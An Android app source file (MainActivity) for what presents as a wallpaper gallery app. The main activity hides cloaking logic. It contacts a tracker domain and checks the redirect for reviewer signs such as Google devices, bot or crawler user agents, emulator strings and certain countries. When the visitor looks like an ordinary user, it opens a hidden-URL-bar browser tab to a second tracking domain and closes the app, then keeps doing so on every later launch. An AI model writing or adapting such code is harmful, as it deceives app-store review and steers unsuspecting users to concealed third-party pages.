package one.more.test;


import androidx.appcompat.app.AppCompatActivity;
import androidx.browser.customtabs.CustomTabsIntent;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.PendingIntent;
import android.app.WallpaperManager;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.provider.MediaStore;
import android.util.Log;
import android.view.GestureDetector;
import android.view.MotionEvent;
import android.view.View;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.widget.ImageSwitcher;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.Toast;
import android.widget.ViewSwitcher;


import com.android.volley.NetworkResponse;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.HurlStack;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.facebook.applinks.AppLinkData;
import com.facebook.applinks.BuildConfig;
import com.onesignal.OneSignal;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Map;
import static one.more.test.Constants.DEPLINK;
import static one.more.test.Constants.MY_SUB_URL;


public class MainActivity extends AppCompatActivity  implements ViewSwitcher.ViewFactory, GestureDetector.OnGestureListener {

    private ImageSwitcher mImageSwitcher;
    private static final int REQUEST_CAMERA = 0;
    ImageView im_share, im_download, im_desktop;
    int position = 0;
    private int[] mImageIds = { R.drawable.pic_1, R.drawable.pic_2,
            R.drawable.pic_3,  R.drawable.pic_4,
            R.drawable.pic_5,  R.drawable.pic_6,  R.drawable.pic_7,  R.drawable.pic_8,  R.drawable.pic_9};
    private String[] mImageName = {"bg_book", "bg_coin", "bg_gas_mask", "bg_fire_extinguisher", "bg_medal", "bg_coin", "bg_gas_mask", "bg_fire_extinguisher", "bg_medal"};

    private GestureDetector mGestureDetector;
    private static final int SWIPE_MIN_DISTANCE = 120;
    private static final int SWIPE_MAX_OFF_PATH = 250;
    private static final int SWIPE_THRESHOLD_VELOCITY = 100;

    Bitmap bitmap;
    String imagePath;
    Uri URI;
    final String SAVED_TEXT1 = "saved_text";
    int i = 10;
    int id = 0;

    boolean openTabs = true;


    private int mStatusCode = 0;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        OneSignal.startInit(this)
                .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                .unsubscribeWhenNotificationsAreDisabled(true)
                .init();




        setContentView(R.layout.activity_main);
        openUI();

        if (InternetCon.checkConnection(getApplicationContext())) {
            // Its Available...

            SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);

         id = settings.getInt("ID", 0);
       /* if(id == 0){

        } */




          if(id == 1){
            Log.i("It's:", "work");
            openLink();





        }else if(id == 2){
            //openUI();
            Log.i("It's:", "id 2 open ui");
        }
            else
        {
            Log.i("Nooooo: ", "work");
        RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext(), new HurlStack() {
            @Override
            protected HttpURLConnection createConnection(URL url) throws IOException {
                HttpURLConnection connection = super.createConnection(url);
                connection.setInstanceFollowRedirects(false);

                return connection;
            }
        });


        String url = "https://juicyyangfruits.fun/QkV7q5yx";
        StringRequest request = new StringRequest(url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.i("statusCode", String.valueOf(mStatusCode));
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Log.e("onErrorResponse", error.toString());
                Map<String, String> header = error.networkResponse.headers;
                Log.i("Redirected URL", header.get("Location"));
                String location = header.get("Location");
                //String [] subs= {"sub1=", "c=", "d=", "e=", "f=", "j=", "i="};
                String [] subs= {"sub1=", "sub3=", "sub4=", "sub5=", "sub6=", "sub7=", "sub9="};
                String [] sub1= {"FreeBSD", "Firefox", "Linux"};
                String [] sub2= {"Nexus", "Pixel", "Moto", "Google"};
                String sub3= "1";
                String sub5= "AR";
                String [] sub6= {"US", "PH", "NL", "GB", "IN", "IE"};
                String [] sub7= {"google", "bot", "adwords", "rawler", "spy", "o-http-client", "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus 5X Build/MTC20F)", "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G935F Build/NRD90M)", "Dalvik/2.1.0 (Linux; U; Android 7.0; WAS-LX1A Build/HUAWEIWAS-LX1A)"};

                for(int index=0; index < subs.length; index++) {
                    String[] parts = location.split(subs[index]);
                    String value = parts[1];
                    parts = value.split("&");
                    value = parts[0];
                    System.out.println(value);
                    if(index == 0 ){
                        checkMass(sub1, value);
                        if(!openTabs)
                            break;

                    }
                    if(index == 1 ){
                        checkMass(sub2, value);
                        if(!openTabs)
                            break;

                    }
                    if(index == 2 || index == 3){
                            if (value.contains(sub3)) {
                                openTabs = false;
                                break;
                            }
                    }
                    if(index == 4 ){
                        if (value.contains(sub5)) {
                            openTabs = false;
                            break;
                        }
                    }
                    if(index == 5 ){
                        checkMass(sub6, value);
                        if(!openTabs)
                            break;

                    }
                    if(index == 6 ){
                        checkMass(sub7, value);
                        if(!openTabs)
                            break;

                    }
                }


                if(openTabs){

                    try {


                        AppLinkData.fetchDeferredAppLinkData(MainActivity.this, appLinkData -> {
                            AppLinkData appLinkData1 = appLinkData;
                            if (appLinkData1 == null || appLinkData1.getTargetUri() == null) {
                                Log.e("MyLog", "deeplink = null");

                                openLink();
                            } else {

                                String url = appLinkData1.getTargetUri().toString();
                                if (com.facebook.applinks.BuildConfig.DEBUG) {
                                }
                                String string = convertArrayToStringMethod(url.split(DEPLINK));
                                SharedPreferences settings5 = getSharedPreferences(SAVED_TEXT1, 0);
                                SharedPreferences.Editor editor = settings5.edit();

                                editor.putString(MY_SUB_URL, string);
                                //editor.putString(MY_SUB_URL, "KEK");
                                editor.commit();



                                if (BuildConfig.DEBUG) {

                                }

                                Log.i("MyLog", string + "nu");
                                openLink();


                            }
                        });
                    } catch (Exception e) {
                        Log.e("my Log" + MainActivity.this, "App Link appLinkData: " + e.toString());

                        e.printStackTrace();
                    }



                SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
                SharedPreferences.Editor editor = settings.edit();

                editor.putInt("ID", 1);
                editor.commit();
                }
                else{
                    SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
                    SharedPreferences.Editor editor = settings.edit();

                    editor.putInt("ID", 2);
                    editor.commit();
                    //openUI();
                }


            }
        }) {
            @Override
            protected Response<String> parseNetworkResponse(NetworkResponse response1) {
                if (response1 != null) {
                    mStatusCode = response1.statusCode;

                    Map<String, String> header = response1.headers;


                }
                return super.parseNetworkResponse(response1);
            }
        };

        requestQueue.add(request);

        }

        } else {
            SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
            SharedPreferences.Editor editor = settings.edit();

            editor.putInt("ID", 2);
            editor.commit();
            // Not Available...
           //openUI();

        }

    }
void openUI(){
    bitmap = BitmapFactory.decodeResource(getResources(), mImageIds[0]);


    im_share = findViewById(R.id.im_share);
    im_download = findViewById(R.id.im_download);
    im_desktop = findViewById(R.id.im_desktop);
    im_share.setOnClickListener((View v) -> {

        sendIm();

    });
    im_download.setOnClickListener((View v) -> {
        if (ContextCompat.checkSelfPermission(getApplicationContext(),
                Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {

            requestCameraPermission();
        } else {
            saveImage();
        }

    });
    im_desktop.setOnClickListener((View v) -> {

        setWP();
    });

    mImageSwitcher = findViewById(R.id.imageSwitcher);
    mImageSwitcher.setFactory(this);

    Animation inAnimation = new AlphaAnimation(0, 1);
    inAnimation.setDuration(2000);
    Animation outAnimation = new AlphaAnimation(1, 0);
    outAnimation.setDuration(2000);

    mImageSwitcher.setInAnimation(inAnimation);
    mImageSwitcher.setOutAnimation(outAnimation);

    mImageSwitcher.setImageResource(mImageIds[0]);

    mGestureDetector = new GestureDetector(this, this);
}
    void checkMass(String [] sub1, String value){

        for(int q = 0; q < sub1.length; q++) {
            if (value.equals(sub1[q])) {
                openTabs = false;
            }

        }

    }
    void openLink(){



        SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
        String myStrValue = settings.getString(MY_SUB_URL, "");

        String url = "https://traffdomnbrncv.fun/pSMJ63p4" + myStrValue;
        Log.i("MyLog: ", myStrValue);
        final Bitmap backButton = BitmapFactory.decodeResource(getResources(), R.drawable.round_done_black_24dp);
        CustomTabsIntent.Builder builder = new CustomTabsIntent.Builder();
        builder.enableUrlBarHiding();
        builder.setToolbarColor(Color.BLACK);
        builder.setShowTitle(false);
        builder.addDefaultShareMenuItem();
        builder.setCloseButtonIcon(backButton);
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            url = "http://" + url;
        }

        builder.addDefaultShareMenuItem();

        CustomTabsIntent customTabsIntent = builder.build();
        String packageName = "com.android.chrome";
        // if we cant find a package name, it means there's no browser that supports
        // Custom Tabs installed. So, we fallback to a view intent


            try {
                customTabsIntent.intent.setPackage(packageName);
                customTabsIntent.launchUrl(MainActivity.this, Uri.parse(url));
                finish();
                // Your startActivity code wich throws exception
            } catch (ActivityNotFoundException activityNotFound) {
                MainActivity.this.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
                // Now, You can catch the exception here and do what you want
                finish();
            }

    }

    public static String convertArrayToStringMethod(String[] strArray) {

        StringBuilder stringBuilder = new StringBuilder();

        for (int i = 0; i < strArray.length; i++) {

            stringBuilder.append(strArray[i]);

        }

        return stringBuilder.toString();

    }
    void requestCameraPermission() {

        if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
            ActivityCompat.requestPermissions(MainActivity.this,
                    new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},
                    REQUEST_CAMERA);
        } else {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},
                    REQUEST_CAMERA);
        }
    }
    public void sendIm() {

        Intent shareIntent = new Intent("android.intent.action.MAIN");
        shareIntent.setAction(Intent.ACTION_SEND);
        Uri uri = Uri.parse("android.resource://" + getPackageName() + "/mipmap/" + mImageName[position]);
        shareIntent.putExtra(Intent.EXTRA_STREAM, uri);
        shareIntent.setType("image/jpeg");
        startActivity(Intent.createChooser(shareIntent, "Share to"));

    }
    public void setWP() {
        bitmap = BitmapFactory.decodeResource(getResources(), mImageIds[position]);
        WallpaperManager wallpaperManager = WallpaperManager.getInstance(getApplicationContext());
        try {
            wallpaperManager.setBitmap(bitmap);
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            Toast.makeText(getApplicationContext(), "Finally set Wallper", Toast.LENGTH_SHORT).show();
        }
    }
    public void saveImage(){

        bitmap = BitmapFactory.decodeResource(getResources(), mImageIds[position]);

        imagePath = MediaStore.Images.Media.insertImage(
                getContentResolver(),
                bitmap,
                mImageName[position],
                mImageName[position]
        );

        URI = Uri.parse(imagePath);

        Toast.makeText(MainActivity.this, "Image Saved Successfully" , Toast.LENGTH_LONG).show();

    }



    public void setPositionNext() {
        position++;
        if (position > mImageIds.length - 1) {
            position = 0;
        }
    }

    public void setPositionPrev() {
        position--;
        if (position < 0) {
            position = mImageIds.length - 1;
        }
    }

    @Override
    public View makeView() {
        ImageView imageView = new ImageView(this);
        imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);
        imageView.setLayoutParams(new
                ImageSwitcher.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
        imageView.setBackgroundColor(0xFF000000);
        return imageView;
    }

    @Override
    public boolean onTouchEvent(MotionEvent event) {
        return mGestureDetector.onTouchEvent(event);
    }

    @Override
    public boolean onDown(MotionEvent e) {
        return false;
    }

    @Override
    public void onShowPress(MotionEvent e) {

    }

    @Override
    public boolean onSingleTapUp(MotionEvent e) {
        return false;
    }

    @Override
    public boolean onScroll(MotionEvent e1, MotionEvent e2, float distanceX, float distanceY) {
        return false;
    }

    @Override
    public void onLongPress(MotionEvent e) {

    }

    @Override
    public boolean onFling(MotionEvent e1, MotionEvent e2, float velocityX, float velocityY) {
        try {
            if (Math.abs(e1.getY() - e2.getY()) > SWIPE_MAX_OFF_PATH)
                return false;
            // справа налево
            if (e1.getX() - e2.getX() > SWIPE_MIN_DISTANCE
                    && Math.abs(velocityX) > SWIPE_THRESHOLD_VELOCITY) {
                setPositionNext();
                mImageSwitcher.setImageResource(mImageIds[position]);
            } else if (e2.getX() - e1.getX() > SWIPE_MIN_DISTANCE
                    && Math.abs(velocityX) > SWIPE_THRESHOLD_VELOCITY) {
                // слева направо
                setPositionPrev();
                mImageSwitcher.setImageResource(mImageIds[position]);
            }
        } catch (Exception e) {
            // nothing
            return true;
        }
        return true;
    }


}



